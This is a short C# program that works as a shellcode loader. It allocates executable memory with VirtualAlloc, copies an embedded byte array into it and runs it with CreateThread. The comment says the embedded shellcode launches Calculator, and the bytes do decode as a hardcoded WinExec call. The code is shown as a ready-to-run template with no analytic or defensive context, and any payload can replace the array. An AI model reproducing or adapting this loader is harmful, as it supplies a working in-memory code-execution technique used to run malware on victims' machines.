using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern IntPtr WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main()
    {
        // Shellcode to open Calculator
        byte[] shellcode = new byte[] {
            0x31, 0xC0, 0x50, 0x68, 0x65, 0x78, 0x65, 0x2E, 0x68, 0x63, 0x61, 0x6C, 0x63,
            0x89, 0xE1, 0xB8, 0xAD, 0x23, 0x86, 0x7C, 0x6A, 0x01, 0x51, 0xFF, 0xD0
        };

        // Allocate memory for shellcode
        IntPtr allocMem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);

        // Copy shellcode into allocated memory
        Marshal.Copy(shellcode, 0, allocMem, shellcode.Length);

        // Create a new thread to execute shellcode
        IntPtr thread = CreateThread(IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);

        // Wait for the shellcode to finish execution
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
